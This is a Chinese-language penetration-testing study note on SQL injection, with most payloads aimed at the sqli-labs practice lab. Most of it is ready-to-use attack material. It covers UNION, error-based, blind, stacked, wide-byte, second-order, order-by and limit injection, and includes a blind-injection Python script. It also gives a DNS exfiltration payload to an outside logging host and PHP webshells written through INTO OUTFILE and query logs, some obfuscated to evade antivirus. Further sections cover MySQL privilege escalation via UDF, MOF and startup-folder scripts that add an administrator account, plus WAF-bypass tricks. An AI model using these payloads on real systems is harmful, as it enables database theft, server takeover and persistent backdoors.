---
title: SQL
date: 2023-09-03T15:29:52+08:00
updated: 2023-04-23T20:41:04+08:00
categories: 
- 渗透测试
- 外网漏洞
---

# SQL注入

## 注入点检测

常见注入点：

- GET/POST/PUT/DELETE参数
- X-Forwarded-For
- 文件名

## 有回显注入

### 字符(数字)型注入

数字型和字符型最大的差别在于查询语句是否使用引号进行包裹，但二者都可通过闭合进行绕过；

**判断列数**

```
http://127.0.0.1/sqli-labs/Less-1/?id=-1%27order%20by%203;--+
未出现错误
http://127.0.0.1/sqli-labs/Less-1/?id=-1%27order%20by%204;--+
抛出错误，说明列数为3；
```

**union联合查询**

```
?id=-1'union select 1,2,database();--+
//列数要与表中列数相同
id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security';--+
//查表名
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users';--+
//查列名
?id=-1'union select 1,2,group_concat(password) from security.users;--+
//查数据
```

### 报错注入

**漏洞成因**

由于mysql开发中使用了print_r mysql_error()函数，将错误内容输出；

**基于xpath的报错注入**

updatexml(),extractvalue(),在查询时如果出现xml文档路径出错，则会抛出错误；

**updatexml():**

语法:

UpdateXML(xml_target, xpath_expr, new_xml)

**xml_target:：** 需要操作的xml片段

**xpath_expr：** 需要更新的xml路径(Xpath格式)

**new_xml：** 更新后的内容

*`xml_target`*此函数用新的 XML 片段 替换给定 XML 标记片段的单个部分*`new_xml`*，然后返回更改后的 XML。被替换的部分 匹配 用户提供的 *`xml_target`*XPath 表达式。*`xpath_expr`*如果未 *`xpath_expr`*找到匹配的表达式，或者找到多个匹配项，该函数将返回原始 *`xml_target`*XML 片段。所有三个参数都应该是字符串。(直接谷歌翻译了)

```sql
mysql> select * from users where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~security~' #0x7e被解码成~,~不满足Xpath语法;数据库名同错误一起显示
```

**extractvalue()**

ExtractValue(*`xml_frag`*, *`xpath_expr`*)

ExtractValue()采用两个字符串参数，一个 XML 标记片段 *`xml_frag`*和一个 XPath 表达式 *`xpath_expr`*（也称为 定位器）；`CDATA`它返回第一个文本节点的 文本 ( )，该文本节点是与 XPath 表达式匹配的一个或多个元素的子元素。

使用此函数等同于使用*`xpath_expr`*after appending执行匹配`/text()`。换句话说， [`ExtractValue('Sakila', '/a/b')`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue)和 [`ExtractValue('Sakila', '/a/b/text()')`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue)产生相同的结果。

```sql
select * from users where id=1 and extractvalue(1,concat(0x7e,(select database()),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~security~'# extractvalue同理
```

**floor报错注入**

我们通过payload来进行分析

```sql
select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;
select count(*) from users group by concat(database(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry 'security1' for key '<group_key>'
#抛出错误<group_key>主键重复
#floor(rand(0)*2);
#rand函数
rand函数根据我们给的种子而产生固定的伪随机数；
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
+---------------------+
#该数据是固定的
mysql> select rand(0) from users;
+---------------------+
| rand(0)             |
+---------------------+
| 0.15522042769493574 |
|   0.620881741513388 |
|  0.6387474552157777 |
| 0.33109208227236947 |
|  0.7392180764481594 |
|  0.7028141661573334 |
|  0.2964166321758336 |
|  0.3736406931408129 |
|  0.9789535999102086 |
|  0.7738459508622493 |
|  0.9323689853142658 |
|  0.3403071047182261 |
|  0.9044285983819781 |
+---------------------+
13 rows in set (0.00 sec)
#users表有13行，产生13个伪随机;
#floor函数
floor()取整函数
由于payload中对rand(0)*2，我们可以看下结果是什么
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
+------------------+
产生0，1序列；
#group by
group by语句用于结合聚合函数，根据一个或多个列对结果集进行分组。
在该语句执行时，会创建一个临时的表，如果表中主键不存在就插入，存在则+1；
mysql> select count(*) from users group by username;
+----------+
| count(*) |
+----------+
|        2 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
|        1 |
+----------+
#count(*)函数
COUNT(*) 返回指定表中的行数，并保留重复行。它分别计算每一行。这包括包含空值的行。
mysql> select count(*) from users;
+----------+
| count(*) |
+----------+
|       13 |
+----------+
1 row in set (0.00 sec)
至此我们再来看payload
#select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;
group by在与rand 同时使用时其实会计算多次；
+------------------+ #根据此表分析
| floor(rand(0)*2) | #第一个数据产生0，但是由于两次计算，这里插入security1
+------------------+ #再次多次运算，security1已经存在，+1即可
|                0 | #第三条数据，经过第一次计算为security0,表中没有该键group by 认为插入，但是再次计算得到security1
|                1 | #与表内的键重复，从而产生错误
|                1 | #注意第二次计算是在判断表中是否有该键值之后
|                0 |
|                1 |
+------------------+
用sqli-labs做个测试
#http://127.0.0.1/sqli-labs/Less-1/?id=1' union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+
//数据库名
#?id=1' union select 1,count(*),concat(0x7e,(select (table_name) from information_schema.tables where table_schema='security' limit 3,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+
//表名
#?id=1' union select 1,count(*),concat(0x7e,(select (column_name) from information_schema.columns where table_schema='security' limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x--+
//列名
#?id=1' union select 1,count(*),concat(0x7e,(select concat_ws(":",username,id,password) from users limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.columns group by x--+
//爆值
```

**过滤floor或者rand的情况**

mysql中除了floor函数，还有其他取整函数，例如ceil和round,其中ceil为向上取整，round为四舍五入，ceil参数和floor参数一致

round(s,n)对s四舍五入取n位小数；

### 布尔盲注

布尔盲注其实和时间盲注差别并不大，都是比较字符；

布尔盲注最大的特点就是在你猜字符正确或者错误时页面有明显的回显，例如sqli-labs第五关当你猜对时会显示you are in;

还是找个简单的脚本看看

```python
        if res.text.find("You are in") > 0:
            flag += j
            print(i)
            print(flag)
            break
        else:
            print('wrong') #最大的区别就是需要使用页面回显来进行判断
```

### 堆叠注入

堆叠注入顾名思义，由于sql语句以分号作为结束，我们可以利用分号，同时写入多条语句，来查询数据；

```sql
mysql> select * from users;select * from users where id=1;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)

+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)
```

既然可以查询数据，同样可以进行其他操作；

```sql
mysql> select count(*) from user;insert into user(id,name,passwd) values(9,'aaa','aaa');
+----------+
| count(*) |
+----------+
|        2 |
+----------+
1 row in set (0.00 sec)

Query OK, 1 row affected (0.00 sec)
#两个语句同时执行，再次查询数据时回发现数据已经插入表中
```

**利用handler语句**

```sql
通过handler语句我们可以先打开一张表，再去读取它的内容
handler user open as xxx;handler xxx read first;
mysql> handler user open;handler user read first;
Query OK, 0 rows affected (0.00 sec)

+------+------+--------+
| id   | name | passwd |
+------+------+--------+
|    1 | 1    | NULL   |
+------+------+--------+
```

**prepare语句**

```sql
预制语句的SQL语法基于三个SQL语句：
prepare stmt_name from preparable_stmt;
execute stmt_name [using @var_name [, @var_name] ...];
{deallocate | drop} prepare stmt_name;
Prepare xxx from 0x73686F77207461626C6573;EXECUTE xxx;
0x后面的代表hex进行编码的'show tables'
```

### 宽字节注入

宽字节指的是类似于GB2312、GBK、BIG5等需要两个字节编码的字节；

如果php中编码为GBK，函数传入为ascii码，mysql中默认编码是gbk等宽字节，则会造成两个ascii码被当成一个宽字节的形式，造成绕过；

来看sqli-labs中的代码；

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
       return $string;
}
//这部分代码将 / ' "进行了转义，在前面默认加上/
//当我们传入一个ascii大于128的字符时(例如%cc')，经过函数转义成%cc%5c',由于设置了宽字节编码mysql_query("SET NAMES gbk");
//前面两个ascii编码被当成了一个宽字符（蘚'）从而形成了字符型注入的形式；
我们可以来看看数据库中定义的编码
mysql> SHOW VARIABLES LIKE 'character%';
+--------------------------+--------------------------------------------------------+
| Variable_name            | Value                                                  |
+--------------------------+--------------------------------------------------------+
| character_set_client     | utf8                                                   |
| character_set_connection | utf8                                                   |
| character_set_database   | gbk                                                    |
| character_set_filesystem | binary                                                 |
| character_set_results    | utf8                                                   |
| character_set_server     | utf8                                                   |
| character_set_system     | utf8                                                   |
| character_sets_dir       | E:\phpstudy_pro\Extensions\MySQL5.7.26\share\charsets\ |
+--------------------------+--------------------------------------------------------+
//id=%cc'union select 1,2,databse();--+即可查询到数据库；
```



## 无回显注入

### 时间盲注

**使用if语句**

```
if语句
if(2>1,sleep(3),1);
if语句类似于三目运算，第一项为比较，为真sleep(3),为假返回1；sleep(3)正好是我们判断字符是否正确的原理；
请看下面这条if语句；
if((ascii(substr(database(),1,1)))=115,sleep(3),1);--+
我们将数据库的第一个字符取出并转换为ascii码与115(s)进行对比，正确则会产生延时；
?id=1'and if((ascii(substr(database(),1,1)))='115',sleep(3),1);--+
```

随便拖个盲注脚本来分析一下

```py
import requests
import sys
import time

url = ""#此处插入目标url
flag = '' 
flagstr = "1234567890abcdefghijklmnopqrstuvwxyz-}" #设定盲注需要用到的字段
for i in range(0,50):  #数据长度
    for j in flagstr:
        #payload="1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))='{}',benchmark(5000000,sha(1)),1)#".format(i,ord(j))
        #payload ="1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='表名'),{},1))='{}',benchmark(50000000.sha(1)),1)#".format(i,ord(j))
        payload= "999) or if(ascii(substr((select flagaabc from 数据库),{},1))='{}',benchmark(5000000,sha(1)),1)#".format(i,ord(j))
        data = {  
            "ip":payload,  #发送的data数据
            "debug": 1,
        }
        try:
            res = requests.post(url=url,data=data,timeout=2)
            time.sleep(0.3)#延迟放到发包后面，比较稳定
        except:
            flag += j 
            print(flag) #打印数据
            break
```

由该脚本可以看出我们能够造成延时的函数并不只有sleep一个，benchmark算sha值同样能够造成延时，具有相同效果但更为复杂的还有计算笛卡尔积；

同样的ascii被禁用我们可以使用ord进行替换

substr被禁用可以是使用left,right进行等价代换

```
right(left('abcdef',3),1)`等价于`substr('abcdef',3,1)
```

**利用笛卡尔积造成的延时**

```
当我们使用
select * from database.user,database.user2;
就会将连个表进行笛卡尔积运算；但是根据columns数量的不同时间也不相同；
```

![笛卡尔积](E:\笔记软件\笔记\从零开始的web安全\笛卡尔积.png)

使用character_sets(41行)和collations(222行)可能会比较好控制；

```sql
mysql> SELECT count(*) FROM information_schema.columns A,information_schema.collations C,information_schema.collations B;
+-----------+
| count(*)  |
+-----------+
| 162538632 |
+-----------+
1 row in set (3.91 sec)
```

**get_lock(str,timeout)精确控制延时**

```
Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.
文档来自于官方
```

简单来说我们可以设定一个session唯一变量，在另一session中即可执行延时；

```sql
select get_lock('fu3o',1);
+--------------------+
| get_lock('fu3o',1) |
+--------------------+
|                  1 |
+--------------------+
1 row in set (0.00 sec)
//设定一个变量
mysql> select get_lock('fu3o',3);
+--------------------+
| get_lock('fu3o',3) |
+--------------------+
|                  0 |
+--------------------+
1 row in set (3.01 sec)
//进行延时操作
```

**reDos正则回溯延时**

NFA回溯机制，会对匹配的字符串进行多次扫描；

通过rpad设定长字符串，利用repeat来达到回溯延时的效果；

```sql
mysql> select rpad('a',1000000,'a') rlike concat(repeat('(a.*)+',100),'b');
+--------------------------------------------------------------+
| rpad('a',1000000,'a') rlike concat(repeat('(a.*)+',100),'b') |
+--------------------------------------------------------------+
|                                                            0 |
+--------------------------------------------------------------+
1 row in set (1.36 sec)
#可通过两个参数来控制延时的长短;
mysql> select rpad('a',1000000,'a') regexp concat(repeat('(a.*)+',500),'b');
+---------------------------------------------------------------+
| rpad('a',1000000,'a') regexp concat(repeat('(a.*)+',500),'b') |
+---------------------------------------------------------------+
|                                                             0 |
+---------------------------------------------------------------+
1 row in set (7.20 sec)
```

## 二次注入

原理：用户首先将恶意数据插入数据库，在此之前可能会进行过滤等操作，但是存储在数据库中的内容肯定与用户输入一致，用户就能通过数据库内的恶意内容，在第二次执行恶意命令；

```php
function sqllogin(){
   $username = mysql_real_escape_string($_POST["login_user"]);
   $password = mysql_real_escape_string($_POST["login_password"]);
   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
//在登陆页面输入数据会进行\转义
//同理在注册页面，当我们输入admin'时会被转译为amdin\'，但存入数据库时是以admin'形式存入；
//注册一个名为admin'#的用户
mysql> select * from users where id =15;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 15 | admin'#  | admin    |
+----+----------+----------+
//我们以admin'#身份进行登录来改密码；
//后端验证为
    $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
    //由于我们当前用户为admin'#插入到语句中变成了username='admin'#'，因此修改当前用户的密码详单与修改了admin的密码；
```

## 无列名注入

无列名注入，顾名思义，在没有列名的情况下， 通过取别名的操作来进行查询；

一般情况下information_schema会被禁用，我们可以使用其他的库

可能会用到

```php
mysql.innodb_table_stats
mysql.innodb_index_stats
//这两个表包含了database_name和table_name
sys.schema_auto_increment_columns
//此视图指示哪些表具有 AUTO_INCREMENT列并提供有关这些列的信息，例如当前和最大列值以及使用率（已使用值与可能值的比率）。
//该视图具有表名和列名，对于该表能够回显的列做以下尝试，一直表只显示有自增属性的表
mysql> alter table user add primary key(id);
Query OK, 3 rows affected (0.00 sec)
//对id列设置主键
mysql> alter table user modify id int auto_increment;
Query OK, 3 rows affected (0.00 sec)
//对id设置自增
//更换使用表在有自增的情况下
mysql> select * from users where id =-1 union select 1,2,group_concat(column_name) from sys.schema_auto_increment_columns where table_name = 'users';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | id,id,id |
+----+----------+----------+
1 row in set (0.01 sec)
//能够查询出具有自增属性的id
//删除自增属性
mysql> alter table users modify id int;
Query OK, 14 rows affected (0.00 sec)
Records: 14  Duplicates: 0  Warnings: 0
//再查询一次
mysql> select * from users where id =-1 union select 1,2,group_concat(column_name) from sys.schema_auto_increment_columns where table_name = 'users';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | id,id    |
+----+----------+----------+
1 row in set (0.01 sec)
//查询出来的数量减少了，我们在sqli-labs上尝试一下，同样回显减少了一个，但是不知道有什么区别
schema_table_statistics_with_buffer 和 x$schema_table_statistics_with_buffer 视图
//这些视图汇总表统计信息，包括 InnoDB缓冲池统计信息。默认情况下，行按总等待时间降序排列（争用最多的表排在最前面）.
//需要注意这两个试图无法查询列名
schema_table_statistics 和 x$schema_table_statistics 视图
//同样只有表名没有列名
```

```sql
mysql> select 1,2,3 union select * from user;
+------+-------+-------+
| 1    | 2     | 3     |
+------+-------+-------+
|    1 | 2     | 3     |
|    1 | 1     | NULL  |
|    2 | admin | admin |
|    9 | aaa   | aaa   |
+------+-------+-------+
#将user表中的三列命名为1，2，3再来查寻
mysql> select b from (select 1,2,3 as b union select * from user)a;
+-------+
| b     |
+-------+
| 3     |
| NULL  |
| admin |
| aaa   |
+-------+
#将第三列命名为b并将其查询出来
mysql> select concat(b,0x2d,c) from (select 1,2 as b,3 as c union select * from user)a;
+------------------+
| concat(b,0x2d,c) |
+------------------+
| 2-3              |
| 1-NULL           |
| admin-admin      |
| aaa-aaa          |
+------------------+
#用concat对查询的内容进行联合
#select table_name from mysql.innodb_index_stats where  database_name= database() 获取表名
```

**使用join...using()...语句**

```sql
#使用join语句时会将自身表和列形成内联，因为列名重复问题，从而抛出错误，错误中带有列名；
#通过join来查询第一个列名
?id=-1' union all select * from (select * from users as a join users as b)as c--+
#查第二个列名
?id=-1'union all select * from (select * from users as a join users as b using(id))c--+
#查第三个列名
?id=-1'union all select * from (select * from users as a join users as b using(id,username))c--+
#获取所有的列名
mysql> select * from users where id=1 union select * from (select * from users as a join users as b using(id,username,password))as c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | admin'#  | admin      |
+----+----------+------------+
```

## DNS注入

DNS注入用于简化盲注，增快盲注的速度，默认情况无法使用，需要secure-file-priv参数为空；

DNS指向我们服务器的域名，解析域名时需要向DNS服务器查询，能够递归出数据库的数据；

```sql
mysql> show variables like 'skip_name_resolve';
+-------------------+-------+
| Variable_name     | Value |
+-------------------+-------+
| skip_name_resolve | OFF   |
+-------------------+-------+
1 row in set, 1 warning (0.00 sec)
```

需要注意的是，该方法仅在windows下适用，路径以\开头的路径在Windows中被定义为UNC路径，所以填写域名，windows会进行DNS查询，而linux则不会；

```
1' and if((select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\txf'))),1,0)--+
//在管理页面查看到数据库名，之后只需要更改select database()部分即可；
//四个\\\\中有两个用于转义；
```

## Order by 注入

order by 在mysql中是对查询的数据进行排序的操作；

```sql
mysql> select * from users order by 2;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  8 | admin    | admin      |
| 15 | admin'#  | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 14 | admin4   | admin4     |
|  2 | Angelina | I-kill-you |
|  7 | batman   | mob!le     |
| 12 | dhakkan  | dumbo      |
|  1 | Dumb     | Dumb       |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
+----+----------+------------+
14 rows in set (0.00 sec)

mysql> select * from users order by username;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  8 | admin    | admin      |
| 15 | admin'#  | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 14 | admin4   | admin4     |
|  2 | Angelina | I-kill-you |
|  7 | batman   | mob!le     |
| 12 | dhakkan  | dumbo      |
|  1 | Dumb     | Dumb       |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
+----+----------+------------+
14 rows in set (0.00 sec)
#我们发现这两条命令的排序是相同的，说明order by后以跟数字也可以跟列名，列名会根据顺序定位到相应的列名；
#默认排序为asc。如果我们需要倒序则可以使用desc参数；
select * from users order by username desc;
```

order by 注入一般出现在表格需要排序或者对比的情况，而order by语句以为后面需要紧跟column_name的特殊性，无法被预编译防御，只能通过白名单进行防御；

**测试order by 注入是否存在**

```sql
order by rand()
order by rand(1=1)
order by rand(1=2)
#通过随机数来查看排序是否改变
#也可以使用大数据--> 9999，或者构造语句错误  --> (select 1 union select 2)
```

**利用语句**

基于报错注入的order by

```sql
?sort=updatexml(1,concat(0x7e,(select database()),0x7e),1)
?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)
```

基于盲注的order by 

```sql
#使用if语句
#知道列名的情况
if(ascii(substr((select database()),1,1))='115',id,username)--+
#表达式为真就按照id排序，否则按照username排序，根据顺序不同来进行盲注
#不知道列名的情况
?sort=if(ascii(substr((select database()),1,1))=116,1,(select 1 from information_schema.tables))
#返回Subquery returns more than 1 row
?sort=if(ascii(substr((select database()),1,1))=115,1,(select 1 from information_schema.tables))
#返回正常页面

#使用时间盲注
mysql> select * from user order by if(1=1,1,sleep(2));
+----+-------+--------+
| id | name  | passwd |
+----+-------+--------+
|  1 | 1     | bbb    |
|  9 | aaa   | aaa    |
|  2 | admin | admin  |
+----+-------+--------+
3 rows in set (0.00 sec)
mysql> select * from user order by if(1=2,1,sleep(2));
+----+-------+--------+
| id | name  | passwd |
+----+-------+--------+
|  1 | 1     | bbb    |
|  9 | aaa   | aaa    |
|  2 | admin | admin  |
+----+-------+--------+
3 rows in set (6.00 sec)
#通过表达式来造成延时
#并不推荐使用时间盲注是因为延时时间会随列数的多少成倍数进行增长，需要我们进行时间的控制

#使用rand函数进行盲注
mysql> select * from user order by rand(true);
+----+-------+--------+
| id | name  | passwd |
+----+-------+--------+
|  9 | aaa   | aaa    |
|  1 | 1     | bbb    |
|  2 | admin | admin  |
+----+-------+--------+
3 rows in set (0.00 sec)

mysql> select * from user order by rand(false);
+----+-------+--------+
| id | name  | passwd |
+----+-------+--------+
|  1 | 1     | bbb    |
|  2 | admin | admin  |
|  9 | aaa   | aaa    |
+----+-------+--------+
3 rows in set (0.00 sec)
#通过返回的表进行比较
?sort=rand(ascii(substr((select database()),1,1))=115)
?sort=rand(ascii(substr((select database()),1,1))=116)
#显然二者排序不相同
```

## 异或注入

利用XOR来构造真假；

```sql
mysql> select 1 XOR 1 as result;
+--------+
| result |
+--------+
|      0 |
+--------+
1 row in set (0.00 sec)

mysql> select 0 XOR 1 as result;
+--------+
| result |
+--------+
|      1 |
+--------+
1 row in set (0.00 sec)
#利用这个特性，我们能够构造盲注
?id=1'^(ascii(substr((select database()),1,1))='115')^'1'='1'--+
#回显正常
?id=1'^(ascii(substr((select database()),1,1))='116')^'1'='1'--+
#回显错误
```

## limit注入

limit注入可简单分为有order by和无order by情况

```sql
#无order by的情况,可直接在limit后面跟联合查询语句
select id from users  limit 0,1 union select username from users;

#有order by的情况，通常与报错注入和盲注联系在一起
#无法使用union，可以使用procedure函数+analyse以及into关键字
#版本需求5.0.0< MySQL <5.6.6
select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
#报错注入
PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
#时间注入
```



## 写shell

**into outfile**

```sql
#利用条件
需要知道网站的绝对路径
需要具有文件权限
secure_file_priv无值，即允许文件的访问；
#基本语法
a' union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/a.php"%23
a' union select "<?php eval($_POST[1]);?>" into dumpfile "/var/www/html/a.php"%23'
#如果我们能直接控制一个文件名
filename=1.php' lines terminated by '<?php eval($_POST[1]);phpinfo();?>'%23
#into outfile后面可以跟lines terminated by；lines starting by；fields terminated by；来控制我们文件的写入内容；
?id=1 into outfile 'C:\info.php' FIELDS TERMINATED BY '<?php phpinfo();?>'%23
#使用编码
#将一句话木马转换为16进制，例如<?php eval($_POST[1]);?> 转换得到3c3f7068706576616c28245f504f53545b315d293b3f3e
#记得在3c前添上0x,即0x3c3f7068706576616c28245f504f53545b315d293b3f3e
union select 1,0x3c3f7068706576616c28245f504f53545b315d293b3f3e into outfile "////.php"
```

**基于日志**

```sql
#利用条件
有root权限
#基本语法
show variables like '%general%';  -- 查看配置，日志文件是否开启以及默认的日志存储地址
set global general_log=ON; --开启日志监测（文件大小随时间增加）
set global general_log_file ='/var/www/html/info.php'; --设置日志路径
select '<?php phpinfo();?>'; --查询一下，写入shell;
--结束后记得恢复路径和设置

#利用慢查询写shell
#使用慢查询可以让我们的shell出错率减小
show variables like '%slow_query_log%'; --查看慢查询信息；
#E:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\xxxxxxx-slow.log(记录注意转义)
set global slow_query_log=1; --启用
set global slow_query_log_file='E:\\phpstudy_pro\\www\\shell.php'; --修改路径
select '<?php @eval($_POST[1]);?>' or sleep(11);--写shell
#使用sleep原因在于超过sql默认查询时间的语句才会记录入慢查询日志，我们可以通过long_query_time来查看到默认时间
show global variables like '%long_query_time%';
#SQL查询免杀shell（来源于狼组知识库）
select "<?php $sl = create_function('', @$_REQUEST['klion']);$sl();?>";

SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>";
```

**sqlmap**

```
#数据库直连提权
--os-shell
sqlmap.py -d mysql://root:root@xx.xx.xx.xx:3306/test --os-shell
#数据库交互模式
--sql-shell
#数据库权限提升
--priv-esc
#获取用户密码
--passwords（无法解密就给你hash）
```

## Mysql提权

**UDF提权**

```sql
用户自建函数，在mysql>=5.1，UDF动态链接库文件需要放在lib\plugin下，用户才能自建函数
sqlmap根目录/data/udf/mysql下存在该文件,但是需要经过cloak.py解密，也能够使用网上已经解密的版本；
#寻找该插件位置
mysql> show variables like '%plugin%';
E:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\
#若不存在该路径，可通过mysql安装目录进行手工创建
mysql>  select @@basedir;
 E:\phpstudy_pro\Extensions\MySQL5.7.26\
select 114514 into outfile 'E:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation';

#写入动态链接库
#具有高权限，mysql插件目录可写，secure_file_priv无值,这种情况可以直接使用sqlmap
python sqlmap.py -u url --file-write="本地文件路径" --file-dest="目标路径" --data "xxx"
#手动写入
select 0x.......(16进制) into dumpfile '/usr/lib/mysql/plugin/udf.dll';

#创建自建函数并进行调用
mysql> create function sys_eval returns string soname 'udf.dll';
Query OK, 0 rows affected (0.01 sec)
#查看是否创建
mysql> select * from mysql.func;
+----------+-----+---------+----------+
| name     | ret | dl      | type     |
+----------+-----+---------+----------+
| sys_eval |   0 | udf.dll | function |
+----------+-----+---------+----------+
mysql> select sys_eval('whoami');
#成功执行命令
#删除自定义函数
mysql> drop function sys_eval;
Query OK, 0 rows affected (0.00 sec)
```

**反弹端口提权**

```
利用langouster_udf.php即可
```

**MOF提权**

```
#原理：
C:/Windows/system32/wbem/mof/ 目录下的mof文件每隔一段时间就会执行一次，可以利用内部的vbs脚本执行cmd命令，如果mysql有权限操作mof目录，就能写入脚本执行命令了；
#MSF中有自带的MOF提权板块
msf6 > use exploit/windows/mysql/mysql_mof
set payload windows/meterpreter/reverse_tcp
set rhosts 
set username 
set password 即可
#由于mof基本上利用在2003环境以下，所以没有手工复现
```

**启动项提权**

```
#原理：
当windows启动项可以被mysql写入时，可以使用mysql将自定义脚本导入到启动项中，脚本会在windows用户登录，开机，关机时自动运行
windows server 2003启动项路径
# 中文系统
C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
C:\Documents and Settings\All Users\「开始」菜单\程序\启动
# 英文系统
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup
# 开关机项 需要自己建立对应文件夹
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown
windows server 2008启动项路径
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
#基础vbs命令
Set WshShell=WScript.CreateObject("WScript.Shell") 
WshShell.Run "net user hacker P@ssw0rd /add", 0  
WshShell.Run "net localgroup administrators hacker /add", 0
#创建一个hacker用户并将其添加进管理组中
#也能利用cs生成码来上线
select 0x.......... into dumpfile "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
#MSF中同样有启动项提权的模块
use exploit/windows/mysql/mysql_start_up
#设置以下目标数据库的信息连接
set rhosts 
set username
set password
run
```

**CVE-2016-6663**

```
拉取镜像
docker pull sqlsec/cve-2016-6663
部署镜像
docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663
进入容器
docker exec -it container-id /bin/bash
```

环境有一点问题，之后再来复现

## sql绕过waf

```sql
#双写绕过
union select 1,2,database();
=> ununionion seselectlect 1,2,database();

#大小写混淆
union select 1,2,database();
=> UniOn SeleCt 1,2,databse()

#=被过滤
mysql> select * from user where id =1;
+----+------+--------+
| id | name | passwd |
+----+------+--------+
|  1 | 1    | bbb    |
+----+------+--------+
mysql> select * from user where id like 1;
+----+------+--------+
| id | name | passwd |
+----+------+--------+
|  1 | 1    | bbb    |
+----+------+--------+
同样的有 rlike ,regexp

#order by被过滤，使用into变量名替代
mysql> select * from user where id=1 into @a,@b,@c;
Query OK, 1 row affected (0.00 sec)

#and/or的替代
and => &&
or  => ||
not => !
xor => |

#针对union select关键字的绕过
使用<> uNioN sel<>et  #<>解析为空
使用url编码  union %53elect 
使用% union sel%ect 
使用空格 union sel%0ect 
内联注释绕过 /!*union*//!*select*/ 
加号代替空格 union+select
注释代替空格 union/**/select
all绕过 union all select 
#这些方法可以结合，例如
内联注释加url编码 uNioN/!*%53elect*/
 
 #空格的绕过
 /**/
 ()
 回车(%0a)
 `
 tap
